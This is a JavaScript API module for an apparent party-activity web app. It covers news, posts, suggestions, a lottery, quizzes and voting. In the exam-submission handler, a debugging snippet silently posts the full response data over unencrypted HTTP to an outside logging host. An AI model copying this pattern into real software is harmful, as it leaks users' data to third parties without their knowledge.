// //////////////////////////////////////////////////////////////////////// //
// 注意:                                                                    //
//   接口的 then 里不能出现 JS 错误，出错会导致调用接口时，总是进入 catch 部分   //
//   使用属性时一定要先判断属性是否存在、类型是否正确                           //
//   如果总是进入 catch 部门，可以 catch(e){console.log(e)} 查看 JS 错误信息   //
// //////////////////////////////////////////////////////////////////////// //

import service from 'src/api';
import { Config } from 'src/config';

// 当前时间戳
function time(dateString = '') {
  dateString = dateString.replace(/-/g, '/');
  return Date.parse(dateString || new Date()) / 1000;
}
// 时间戳转日期 只支持 'Y-m-d H:i:s','Y-m-d','H:i:s' 三种调用方式
function getDate(format, time) {
  var _temp = time != null ? new Date(time * 1000) : new Date();
  var _return = '';
  if (/Y-m-d/.test(format)) {
    var _day = [
      _temp.getFullYear(),
      addzero(1 + _temp.getMonth()),
      addzero(_temp.getDate())
    ];
    _return = _day.join('-');
  }
  if (/H:i:s/.test(format)) {
    var _time = [
      addzero(_temp.getHours()),
      addzero(_temp.getMinutes()),
      addzero(_temp.getSeconds())
    ];
    _return += ' ' + _time.join(':');
  }
  return _return;
  function addzero(i) {
    if (i <= 9) {
      return '0' + i;
    } else {
      return i;
    }
  }
}

export const activity = {
  DangJianDongTai: {
    list: params => {
      return service
        .post('/api/PartyActivity/PaPartyDynamic/GetDynamicByAdopt', params)
        .then(res => {
          res.data.Data.list = res.data.Data.PageData.map(v => {
            return {
              id: v.ID || 0,
              title: v.PartyDynamicTitle || v.AffairsTitle || v.NoteTitle || '',
              content: v.PartyDynamicContent
                ? v.PartyDynamicContent.replace(/<[^>]+>/g, '')
                : '',
              date: v.CheckDate || v.FillInDate || v.CreateDate || '',
              view: v.ReadNumber || 0
            };
          });
          return res.data;
        });
    },
    detail: params => {
      return service
        .post('/api/PartyActivity/PaPartyDynamic/GetDynamicByID', params)
        .then(res => {
          let article = { baseInfo: {}, files: [] };
          // 文章正文信息
          let document = {};
          if (res.data.Data.Dynamic && res.data.Data.Dynamic[0]) {
            document = res.data.Data.Dynamic[0];
          }
          // console.log('document:', document);
          article.baseInfo = {
            type: document.FileType || '',
            id: document.ID || '',
            title: document.PartyDynamicTitle || '未命名',
            content: document.PartyDynamicContent || '暂无备注',
            author: document.UserName || document.CreateUser || '',
            view: 0, // 不使用访问量功能
            date: document.CreateDate || ''
          };
          // 附件
          if (res.data.Data.file) {
            article.files = res.data.Data.file.map((val, index, arr) => {
              return {
                id: val.ID || 0,
                name: val.FileName || '',
                path: val.FilePath ? val.FilePath.replace(/^~/g, '') : ''
              };
            });
          } else if (res.data.Data.listfile) {
            // 通知公告里是这个名字
            article.files = res.data.Data.listfile.map((val, index, arr) => {
              return {
                id: val.ID || 0,
                name: val.FileName || '',
                path: val.FilePath ? val.FilePath.replace(/^~/g, '') : ''
              };
            });
          }
          res.data.Data.article = article;
          return res.data;
        });
    },
    // 增加点击
    setViewed: params => {
      return service
        .post('/api/PartyActivity/PaPartyDynamic/ReadNumber', params)
        .then(res => res.data);
    }
  },
  ZhiBuEJia: {
    // 获取列表
    list: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyIndividualActivities/GetIndividualActivities',
          params
        )
        .then(res => {
          // console.log('activity.list:', res);
          let list = [];
          if (res.data.Data.PageData) {
            list = res.data.Data.PageData.map((val, index, arr) => {
              return {
                id: val.ID ? val.ID : '',
                page: {
                  index: index,
                  page: res.data.Data.PageIndex,
                  size: res.data.Data.PageSize
                },
                uid: val.CreateUID || '',
                title: val.ExperienceTitle || '',
                thumb: '',
                author: val.UserName || '',
                organization: val.OrganizationName || '',
                content: val.ExperienceContent
                  ? val.ExperienceContent.replace(/<[^>]+>/g, '')
                  : '',
                view: val.ReadNum || 0,
                like: 0,
                date: val.CreateDate || ''
              }; // index 用于显示留言的楼层号 // page 也用于显示留言的楼层号
            });
          }
          res.data.Data.PageData = list;
          return res.data;
        });
    },
    detail: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyIndividualActivities/GetGetIndividualActivitiesByID',
          params
        )
        .then(res => {
          // console.log(res.data.Data);
          let article = {
            baseInfo: res.data.Data.activitie.map(val => {
              return {
                id: val.ID || '',
                uid: val.CreateUID ? val.CreateUID : '',
                title: val.ExperienceTitle || '未命名',
                author: val.UserName || '',
                view: val.ReadNum || 0,
                like: 0,
                content:
                  val.ExperienceContent.replace(/\n/g, '<br />') ||
                  '[暂无正文内容]',
                date: val.CreateDate || ''
              };
            })[0],
            imgs: res.data.Data.img.map((val, index, arr) => {
              return {
                src: val.FilePath ? val.FilePath.replace(/^~/g, '') : ''
              };
            }),
            replies: res.data.Data.Data.map(val => {
              return {
                id: val.ID || '',
                uid: val.UserID ? val.UserID : '',
                author: val.Commentator || '',
                content: val.CommentContent || '',
                avatar: val.PhotoName || Config.avatarDefault,
                date: val.CommentDate || '',
                comment:
                  val.comment.map(val => {
                    return {
                      id: val.ID || '',
                      uid: val.UserID ? val.UserID : '',
                      author: val.Commentator || '',
                      content: val.CommentContent || '',
                      avatar: val.PhotoName || Config.avatarDefault,
                      date: val.CommentDate || ''
                    };
                  }) || []
              };
            })
          };
          res.data.Data.article = article;
          // console.log('activity.api detail res:', res.data);
          return res.data;
        });
    },
    // 增加点击
    setViewed: params => {
      return service
        .post('/api/PartyActivity/PaPartyReadData/InsertReadData', params)
        .then(res => res.data);
    },
    // 点赞
    like: params => {
      return service.post('/api', params).then(res => res.data);
    },
    // 支部e家增加数据
    add: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyIndividualActivities/InsertIndividualActivities',
          params
        )
        .then(res => res.data);
    },
    // 支部e家上传图片
    upload: (data, config) => {
      return service
        .post(
          '/api/PartyActivity/PaPartyIndividualActivities/UploadFile?op=upload',
          data,
          config
        )
        .then(res => res.data);
    },
    delete: id => {},
    reply: params => {
      return service
        .post('/api/PartyActivity/PaPartyCommentMsg/InsertCommentMsg', params)
        .then(res => res.data);
    }
  },
  JianYanXianCe: {
    // 建言对象
    getTargets: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartySuggestions/GetOrgByLoginMmeber',
          params
        )
        .then(res => {
          res.data.Data = res.data.Data.map((val, i, arr) => {
            return {
              key: val.ID,
              value: val.OrganizationName
            };
          });
          return res.data;
        });
    },
    add: params => {
      return service
        .post('/api/PartyActivity/PaPartySuggestions/InsertSuggestions', params)
        .then(res => {
          return res.data;
        });
    },
    list: params => {
      return service
        .post('/api/PartyActivity/PaPartySuggestions/GetSuggestions', params)
        .then(res => {
          res.data.Data.PageData = res.data.Data.PageData.map((val, i, arr) => {
            return {
              id: val.ID,
              title: val.SuggestionsTitle || '[没有标题]',
              intro: val.SuggestionsContent || '[没有内容]',
              // status: val.ID,
              date: val.CreateDate
            };
          });
          return res.data;
        });
    },
    detail: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartySuggestions/GetSuggestionsByID',
          params
        )
        .then(res => {
          // console.log(res.data.Data);
          let article = {
            baseInfo: res.data.Data.suggestions.map(val => {
              return {
                id: val.ID || '',
                uid: val.CreateUID ? val.CreateUID : '',
                title: val.SuggestionsTitle || '未命名',
                author: val.UserName || '',
                view: val.ReadNumber || 0,
                like: 0,
                content:
                  val.SuggestionsContent.replace(/\n/g, '<br />') ||
                  '[暂无正文内容]',
                date: val.CreateDate || ''
              };
            })[0],
            replies:
              res.data.Data.msg.map(val => {
                return {
                  id: val.ID || '',
                  uid: val.UserID ? val.UserID : '',
                  author: val.Commentator || '',
                  content: val.CommentContent || '',
                  avatar: val.PhotoName || Config.avatarDefault,
                  date: val.CommentDate || '',
                  comment:
                    val.comment.map(val => {
                      return {
                        id: val.ID || '',
                        uid: val.UserID ? val.UserID : '',
                        author: val.Commentator || '',
                        content: val.CommentContent || '',
                        avatar: val.PhotoName || Config.avatarDefault,
                        date: val.CommentDate || ''
                      };
                    }) || []
                };
              }) || []
            // replies: [
            //   {
            //     id: 103,
            //     uid: 113584,
            //     date: '2018-05-04 14:32:17',
            //     content: '3',
            //     author: '李小娃',
            //     avatar: null,
            //     comment: []
            //   },
            //   {
            //     id: 100,
            //     uid: 113584,
            //     date: '2018-05-04 11:43:00',
            //     content: '最新的评论',
            //     author: '李小娃',
            //     avatar: null,
            //     comment: []
            //   },
            //   {
            //     id: 98,
            //     uid: 113584,
            //     date: '2018-05-04 11:38:16',
            //     content:
            //       '2017年5月3日，习近平到中国政法大学考察时，参加了1502班团支部“不忘初心跟党走”主题团日活动，对团员青年成长成才提出了殷切期望。',
            //     author: '李小娃',
            //     avatar: null,
            //     comment: [
            //       {
            //         id: 99,
            //         uid: 113584,
            //         date: '2018-05-04 11:39:05',
            //         content: '同学们进一步坚定了永远跟党走、为国作贡献的决心',
            //         author: '李小娃',
            //         Beauthor: '李小娃',
            //         avatar: null,
            //         Beavatar: null
            //       },
            //       {
            //         id: 99,
            //         uid: 113584,
            //         date: '2018-05-04 11:39:05',
            //         content: '同学们进一步坚定了永远跟党走、为国作贡献的决心',
            //         author: '李小娃',
            //         Beauthor: '李小娃',
            //         avatar: null,
            //         Beavatar: null
            //       }
            //     ]
            //   },
            //   {
            //     id: 96,
            //     uid: 113584,
            //     date: '2018-05-04 11:37:50',
            //     content:
            //       '在“五四”青年节来临之际，中共中央总书记、国家主席、中央军委主席习近平委托工作人员，向中国政法大学民商经济法学院1502班团员青年致以节日的问候，对同学们立志“不忘初心，用一生来践行跟党走的理想追求”予以充分肯定，勉励他们坚定信仰、砥砺品德，珍惜时光、勤奋学习，努力成长为有理想、有本领、有担当的社会主义建设者和接班人，为法治中国建设、为实现中华民族伟大复兴中国梦贡献智慧和力量。',
            //     author: '李小娃',
            //     avatar: null,
            //     comment: [
            //       {
            //         id: 97,
            //         uid: 113584,
            //         date: '2018-05-04 11:38:04',
            //         content: '好长的评论……',
            //         author: '李小娃',
            //         Beauthor: '李小娃',
            //         avatar: null,
            //         Beavatar: null
            //       }
            //     ]
            //   }
            // ]
          };
          res.data.Data.article = article;
          // console.log('activity.api detail res:', res.data);
          return res.data;
        });
    },
    reply: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartySuggestionsCommentMsg/InsertCommentMsg',
          params
        )
        .then(res => res.data);
    }
  },
  ZhengNengLiang: {
    list: params => {
      let url = {
        all: '/api/PartyActivity/PaPartyPositiveEnergy/GetPositiveEnergy', // 配合 IsAdopt 显示所有人的列表
        self:
          '/api/PartyActivity/PaPartyPositiveEnergy/GetPositiveEnergyByMemberID' // 自己的列表，不需要 IsAdopt
      }[params.api];
      return service.post(url, params).then(res => {
        console.log('activity.list:', JSON.parse(JSON.stringify(res.data)));
        let list = [];
        if (res.data.Data.PageData) {
          list = res.data.Data.PageData.map((val, index, arr) => {
            let title = val.PositiveEnergyTitle || '';
            let content = val.PositiveEnergyContent
              ? val.PositiveEnergyContent.replace(/<[^>]+>/g, '')
              : '';
            // 全局正能量列表页没有标题，标题用#包裹后并入正文
            if (params.api === 'all') {
              content = title
                ? '<span class="topic">#' + title + '#</span> ' + content
                : content;
            }
            return {
              id: val.ID ? val.ID : '',
              page: {
                index: index,
                page: res.data.Data.PageIndex,
                size: res.data.Data.PageSize
              },
              uid: val.CreateUID || '',
              title: title,
              thumb: '',
              author: val.UserName || '[匿名]',
              organization: val.OrganizationName || '',
              content: content,
              public: val.IsAdopt || 0,
              reject: val.CheckIntro ? val.CheckIntro : false,
              view: val.ReadNumber || 0,
              like: val.FabulousNumber || 0,
              liked: val.IsLike || false,
              date: val.CreateDate || ''
            }; // index 用于显示留言的楼层号 // page 也用于显示留言的楼层号
          });
        }
        res.data.Data.PageData = list;
        return res.data;
      });
    },
    detail: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergy/GetPositiveEnergyByID',
          params
        )
        .then(res => {
          // console.log(res.data.Data);
          let article = {
            baseInfo: res.data.Data.dynamic.map(val => {
              return {
                id: val.ID || '',
                uid: val.CreateUID ? val.CreateUID : '',
                title: val.PositiveEnergyTitle || '未命名',
                author: val.UserName || '',
                reject: val.CheckIntro ? val.CheckIntro : false,
                view: val.ReadNumber || 0,
                like: val.FabulousNumber || 0,
                content:
                  val.PositiveEnergyContent.replace(/\n/g, '<br />') ||
                  '[暂无正文内容]',
                date: val.CreateDate || ''
              };
            })[0],
            imgs: res.data.Data.file.map((val, index, arr) => {
              return {
                id: val.ID || 0,
                src: val.FilePath ? val.FilePath.replace(/^~/g, '') : ''
              };
            }),
            replies: res.data.Data.msg.map(val => {
              return {
                id: val.ID || '',
                uid: val.UserID ? val.UserID : '',
                author: val.Commentator || '',
                content: val.CommentContent || '',
                avatar: val.PhotoName || Config.avatarDefault,
                date: val.CommentDate || '',
                comment:
                  val.comment.map(val => {
                    return {
                      id: val.ID || '',
                      uid: val.UserID ? val.UserID : '',
                      author: val.Commentator || '',
                      content: val.CommentContent || '',
                      avatar: val.PhotoName || Config.avatarDefault,
                      date: val.CommentDate || ''
                    };
                  }) || []
              };
            })
          };
          res.data.Data.article = article;
          // console.log('activity.api detail res:', res.data);
          return res.data;
        });
    },
    add: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergy/InsertPositiveEnergy',
          params
        )
        .then(res => {
          return res.data;
        });
    },
    update: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergy/UpdatePositiveEnergy',
          params
        )
        .then(res => {
          return res.data;
        });
    },
    delete: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergy/DeletePositiveEnergyByID',
          params
        )
        .then(res => {
          return res.data;
        });
    },
    upload: (data, config) => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergy/UploadFile?op=upload',
          data,
          config
        )
        .then(res => {
          return res.data;
        });
    },
    reply: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyPositiveEnergyCommentMsg/InsertCommentMsg',
          params
        )
        .then(res => {
          return res.data;
        });
    },
    setViewed: params => {
      return service
        .post('/api/PartyActivity/PaPartyPositiveEnergy/ReadNumber', params)
        .then(res => {
          return res.data;
        });
    },
    like: params => {
      return service
        .post('/api/PartyActivity/PaPartyFabulousRecord/InsertFabulous', params)
        .then(res => {
          return res.data;
        });
    }
  },
  ChouJiangZhuanQu: {
    // 转盘上的奖品清单和剩余可抽奖额度
    gifts: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyLotteryGoods/GetLotteryGoodsByIsPutaway',
          params
        )
        .then(res => {
          // 补上没返回的奖品：“谢谢参与”
          res.data.Data.goods.unshift({
            ID: 1,
            GoodsName: '谢谢参与',
            GoodsNum: 0,
            GoodsUnit: '',
            CreateUID: 0,
            CreateDate: '',
            UpdateUID: 0,
            UpdateDate: '',
            IsPutaway: 1,
            GoodsImgPath: '/static/img/gift/default.png',
            GoodsType: 0
          });
          return res.data;
        });
    },
    // 获取答题抽奖的资格
    jeton: params => {
      return service
        .post('/api/PartyStudy/PsScoreRecord/GetScoreRecordByID', params)
        .then(res => res.data);
    },
    // 告诉服务器抽过（或放弃）奖了，可以把抽奖机会收回了
    notify2server: params => {
      return service
        .post('/api/PartyStudy/PsScoreRecord/UpdateScoreRecord', params)
        .then(res => res.data);
    },
    // 中的哪个奖
    gift: params => {
      return service
        .post(
          '/api/PartyActivity/PaPartyLotteryGoods/GetLotteryByMember',
          params
        )
        .then(res => res.data);
    },
    // 中奖名单
    list: params => {
      let url = {
        all: '/api/PartyActivity/PaPartyWinningRecord/GetWinningRecord', // 所有人
        self: '/api/PartyActivity/PaPartyWinningRecord/GetWinningRecordByMember' // 自己的
      }[params.api];
      return service.post(url, params).then(res => {
        res.data.Data.list = res.data.Data.PageData.map(v => {
          return {
            id: v.ID,
            uid: v.CreateUID,
            img: v.GoodsImgPath,
            gift: v.GoodsName,
            name: v.Name,
            date: v.WinningDate
          };
        });
        return res.data;
      });
    }
  },
  // 知识竞赛和答题促学
  examination: {
    list: params => {
      let url = {
        all: '/api/PartyStudy/PsExamPapers/GetExamPapers', // 试卷列表（全部：未做和已做）
        my: '/api/PartyStudy/PsExamPapers/GetMyExamPapers' // 我做过的试卷
      }[params.api];
      return service.post(url, params).then(res => {
        if (res.data.Data && res.data.Data.PageData) {
          res.data.Data.list = res.data.Data.PageData.map(v => {
            let date = '';
            let expire = false; // 已过期
            let notYet = false; // 未开始
            // 10答题促学 20知识竞赛
            if (params.queryModel.PapersClassify === 10) {
              date = v.CreateDate;
            }
            if (params.queryModel.PapersClassify === 20) {
              date = v.AnswerTime;
              let today = {
                begin: time(getDate('Y-m-d 00:00:00')),
                end: time(getDate('Y-m-d 23:59:59'))
              };
              let ts = time(date);
              if (ts < today.begin) {
                expire = true;
              }
              if (ts > today.end) {
                notYet = true;
              }
            }
            let done = v.isAnswer === 3 || false; // 0、未答、1微信答题中，2PC端答题中，3答过了
            if (params.api === 'my') {
              // my 时没有这返回 isAnswer ，这里补上
              done = true;
            }
            let content = '共' + v.PaperQuestionCount + '道题';
            content += '，每题' + v.EveryScore + '分';
            content += '，共' + v.TotalScore + '分';
            if (v.AnswerWhenLong) {
              content += '，考试时间' + v.AnswerWhenLong + '分钟';
            } else {
              content += '，未限制考试时间';
            }
            let statusText = [
              '未答',
              '微信端正在答题',
              'PC端正在答题',
              '答过了'
            ][v.isAnswer];
            return {
              id: v.ID,
              thumb: v.ImgPath || '',
              title: v.PaperTitle,
              content,
              done: done, // 已参与过考试
              expire: expire, // 已过期
              notYet: notYet, // 未开始
              statusCode: v.isAnswer,
              statusText,
              date: date
            };
          });
        }
        return res.data;
      });
    },
    // 获取试卷中的题目
    detail: params => {
      let url = {
        paperBaseInfo: '/api/PartyStudy/PsExamPapers/GetExamPapersByID', // 试卷基本信息，finished 里只有试题且在交卷后当天调用 unfinished_* 接口没有试题数据，只有“你今天答过题了”
        unfinished_10: '/api/PartyStudy/PsExamPapers/GetPapersByanswer', // 答题促学 未做的试卷(返回试题无答案)
        unfinished_20:
          '/api/PartyStudy/PsExamPapers/GetRandomTopicByKnowledgeContest', // 知识竞赛 未做的试卷(返回试题无答案)
        finished:
          '/api/PartyStudy/PsExamPapers/GetQuestionBankAndScoreByExamPapersID', // 做过的试卷(返回试题及答案)
        all: '/api/PartyStudy/PsExamPapers/GetQuestionBankByExamPapersID' // 试卷里边的的试题及答案（管理员专用）
      }[params.api];
      return service.post(url, params).then(res => {
        if (params.api.indexOf('unfinished_') === -1) {
          res.data.Data.code = 200; // params.api===finished 没有 code 属性，在这里补上
          res.data.Data.papers = {};
          res.data.Data.question = res.data.Data.PageData;
        }
        if (res.data.Data && res.data.Data.papers) {
          let v = res.data.Data.papers;
          res.data.Data.paper = {
            id: v.ID || '',
            title: v.PaperTitle || '-',
            count: v.PaperQuestionCount || '-',
            scorePre: v.EveryScore || '-',
            scoreTotal: v.TotalScore || '-',
            duration: v.AnswerWhenLong || '-',
            date: v.CreateDate || '-'
          };
          delete res.data.Data.papers;
        }
        if (res.data.Data && params.api.indexOf('paperBaseInfo') !== -1) {
          let v = res.data.Data;
          let paper = {
            id: v.ID || '',
            title: v.PaperTitle || '-',
            count: v.PaperQuestionCount || '-',
            scorePre: v.EveryScore || '-',
            scoreTotal: v.TotalScore || '-',
            duration: v.AnswerWhenLong || '-',
            date: v.CreateDate || '-'
          };
          delete res.data.Data;
          res.data.Data = { paper };
        }
        if (res.data.Data && res.data.Data.question) {
          res.data.Data.list = res.data.Data.question.map(v => {
            let type = v.QuestionType; // 10判断，20单选，30多选
            let selected = v.SelectedAnswers || ''; // 用户选中的项（答题卡上的）回看试卷时有这个属性
            let answer = v.QuestionRightAnswers || '';
            selected = selected
              .split(',')
              .sort()
              .join(',');
            answer = answer
              .split(',')
              .sort()
              .join(',');
            let question = {
              id: v.ID || '[无标题]',
              question: v.QuestionDescribe || '[无标题]',
              // options: [
              //   { val: 'A', key: '胡锦涛' },
              //   { val: 'A', key: '邓小平' },
              //   { val: 'A', key: '江泽民' },
              //   { val: 'A', key: '习近平' }
              // ],
              answer,
              selected,
              inputType: type === 10 || type === 20 ? 'radio' : 'checkbox',
              type: '', // // radio or multiselect
              typeCn: ''
            };
            switch (type) {
              case 10: // 判断也是单选：是或否
                question.typeCn = '判断题';
                question.type = 'radio';
                break;
              case 20: // 单选
                question.typeCn = '单选题';
                question.type = 'radio';
                break;
              case 30:
                question.typeCn = '多选题';
                question.type = 'multiselect';
                break;
              default:
                question.typeCn = '未知类型' + type;
                question.type = '';
                break;
            }
            // 10判断题共2个答案项，20单选答案共4个答案项，30多选答案共X项
            let options = [];
            for (const i of 'ABCD'.split('')) {
              let val = 'QuestionOption' + i;
              let key = 'QuestionOption' + i + 'Content';
              if (v[key]) {
                options.push({
                  key: v[key],
                  val: v[val]
                });
              }
            }
            if (type === 10) {
              question.options = options;
            } else if (type === 20) {
              question.options = options;
            } else if (type === 30) {
              question.options = options;
            } else {
              console.error(
                '检测到了未知类型的考试题：',
                v.ID,
                v.QuestionDescribe
              );
            }
            return question;
          });
          delete res.data.Data.question;
        }
        return res.data;
      });
    },
    // 解锁试卷（开始答题后试卷会被锁定，需要解锁才能在其它设备上答题）
    unlock: params => {
      return service
        .post('/api/PartyStudy/PsScoreRecord/CancleAnswer', params)
        .then(res => {
          return res.data;
        });
    },
    // 交卷，获取考试成绩
    result: params => {
      return service
        .post(
          '/api/PartyStudy/PsAnswerRecord/InsertAnswerRecordByAnswerLearning',
          params
        )
        .then(res => {
          // 后端开发人员想知道接口返回的内容（用于捕捉接口返回的异常数据）
          try {
            var Ajax = {
              // datat应为'a=a1&b=b1'这种字符串格式，在jq里如果data为对象会自动将对象转成这种字符串格式
              post: function(url, data, fn) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                // 添加http头，发送信息至服务器时内容编码类型
                xhr.setRequestHeader(
                  'Content-Type',
                  'application/x-www-form-urlencoded'
                  // 'text/plain'
                );
                xhr.onreadystatechange = function() {
                  if (
                    xhr.readyState === 4 &&
                    (xhr.status === 200 || xhr.status === 304)
                  ) {
                    fn.call(this, xhr.responseText);
                  }
                };
                xhr.send(data);
              }
            };
            Ajax.post(
              'http://gocoxing.cn/uloc/InsertLog',
              'content=' + Date() + '####' + encodeURI(JSON.stringify(res)),
              // {content: Date() + '####' + JSON.stringify(res)},
              function(r) {
                console.log('R:', r);
              }
            );
            // service.post(
            //   'http://gocoxing.cn/uloc/InsertLog',
            //   {
            //     method: 'post',
            //     params: {
            //       content: Date() + '####' + JSON.stringify(res)
            //     }
            //   },
            //   {
            //     headers: {
            //       'Access-Control-Allow-Origin': '*',
            //       'Content-Type': 'text/plain'
            //       // 'Content-Type': 'application/json'
            //     }
            //   }
            // );
          } catch (e) {
            console.error('http://gocoxing.cn/uloc/InsertLog:', e);
          }
          return res.data;
        });
    },
    // 知识竞赛排名
    order: params => {
      return service
        .post('/api/PartyStudy/PsExamPapers/GetTestScores', params)
        .then(res => {
          function strPad(str, len, sign = '0') {
            str += ''; // 转换为字符串
            len = len < str.length ? str.length : len; // 负值 new Array 时会出错
            return new Array(len - str.length + 1).join(sign) + str;
          }
          if (res.data.Data && res.data.Data.PageData) {
            let list = res.data.Data.PageData.map(v => {
              let score = strPad(v.PapersScore, 8);
              let time = strPad(v.AnswerTookTime, 8);
              let start = strPad(
                (v.StartQuizTime + '').replace(/[^\d]/g, ''),
                16
              );
              let sign = '' + score + time + start;
              return {
                id: v.ID,
                name: v.Name,
                score: v.PapersScore,
                mid: v.PartyMemberID,
                times: v.AnswerTookTime,
                sign,
                date: v.StartQuizTime || '-'
              };
            });
            res.data.Data.list = list;
          }
          return res.data;
        });
    },
    // 用户在当前知识竞赛中排名
    myOrder: params => {
      return service
        .post('/api/PartyStudy/PsExamPapers/GetMmeberScoreByRanking', params)
        .then(res => {
          if (res.data.Data && res.data.Data[0]) {
            let order = res.data.Data[0].Rownum || '-';
            res.data.Data.order = order;
          }
          return res.data;
        });
    }
  },
  LiangDianTouPiao: {
    // 投票活动列表
    list: params => {
      return service
        .post('/api/Ballot/BltBallotTask/GetBltBallotTask', params)
        .then(res => {
          let list = res.data.Data.map(v => {
            return {
              id: v.ID || 0,
              author: v.OrganizationName || '-',
              title: v.TaskName || '',
              dateStart: v.BeginBallotDate || '',
              dateEnd: v.EndBallotDate || ''
            };
          });
          delete res.data.Data;
          res.data.Data = {
            list
          };
          return res.data;
        });
    },
    // 投票活动里的投票项列表
    items: {
      // 项列表
      list: params => {
        return service
          .post('/api/Ballot/BltBallotItem/GetBallotItemByWeChat', params)
          .then(res => {
            let list = [];
            if (res.data.Data.item) {
              list = res.data.Data.item.map(v => {
                return {
                  id: v.ID || 0,
                  title: v.ItemName || '-',
                  thumb: v.PictureImg || '/static/img/default.gif',
                  voted: v.IsVote || false,
                  votes: v.VoteCount || 0
                };
              });
            }
            let article = {};
            if (res.data.Data.task && res.data.Data.task[0]) {
              let v = res.data.Data.task[0];
              article = {
                title: v.TaskName,
                cover: v.TaskImg || '',
                voted: v.IsVote || false,
                start: v.BeginBallotDate || '',
                end: v.EndBallotDate || ''
              };
            }
            delete res.data.Data;
            res.data.Data = {
              article,
              list
            };
            return res.data;
          });
      },
      // 项的排名
      order: params => {
        return service
          .post('/api/Ballot/BltBallotItem/GetRank', params)
          .then(res => {
            let list = [];
            if (res.data.Data.RankList) {
              list = res.data.Data.RankList.map(v => {
                return {
                  id: v.ID || 0,
                  title: v.ItemName || '-',
                  thumb: v.PictureImg || '/static/img/default.gif',
                  voted: v.IsVote || false,
                  votes: v.VoteCount || 0,
                  order: v.order || '-'
                };
              });
            }
            let article = {};
            if (res.data.Data.Task) {
              let v = res.data.Data.Task;
              article = {
                title: v.TaskName,
                cover: v.TaskImg || ''
              };
            }
            delete res.data.Data;
            res.data.Data = {
              article,
              list
            };
            return res.data;
          });
      }
    },
    // 投票项
    item: {
      // 投票项基本信息
      detail: params => {
        return service
          .post('/api/Ballot/BltBallotItem/GetBallotItemByID', params)
          .then(res => {
            let v = res.data.Data && res.data.Data[0] ? res.data.Data[0] : {};
            let article = {
              baseInfo: {
                title: v.ItemName || '',
                author: v.OrganizationName || '',
                content: v.Content || '',
                date: v.CreateDate || ''
              },
              voted: v.IsVote || false
            };
            delete res.data.Data;
            res.data.Data = { article };
            return res.data;
          });
      },
      // 投票项的得票记录
      records: params => {
        return service
          .post('/api/Ballot/BltBallotItem/GetTaskRecordMember', params)
          .then(res => {
            let list = res.data.Data.PageData.map(v => {
              return {
                date: v.BallotDate || '-',
                title: v.UserName || '-'
              };
            });
            res.data.Data.list = list;
            return res.data;
          });
      }
    },
    // 投票动作
    vote: params => {
      return service
        .post('/api/Ballot/BltBallotRecord/InsertBallotRecord', params)
        .then(res => {
          return res.data;
        });
    }
  }
};

export default {
  activity
};
